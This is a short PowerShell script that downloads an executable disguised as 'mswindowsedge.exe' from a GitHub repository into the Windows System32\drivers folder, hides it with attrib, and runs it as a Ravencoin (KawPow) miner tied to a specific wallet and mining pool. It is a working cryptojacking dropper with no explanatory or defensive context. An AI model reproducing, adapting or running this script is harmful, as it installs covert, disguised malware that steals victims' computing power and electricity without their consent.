$Folder = 'C:\Windows\System32\drivers\mswindowsedge.exe'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\mswindowsedge.exe --intensity 13 --algo kawpow --server rvn.2miners.com:6060 --user RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-1 --pass x --watchdog_mode 0
} else {
    "Path doesn't exist."
    cd C:\Windows\System32\drivers ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/mswindowsedge.exe" -OutFile mswindowsedge.exe ; attrib +h mswindowsedge.exe;  C:\Windows\System32\drivers\mswindowsedge.exe --intensity 13 --algo kawpow --server rvn.2miners.com:6060 --user RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-1 --pass x --watchdog_mode 0
}
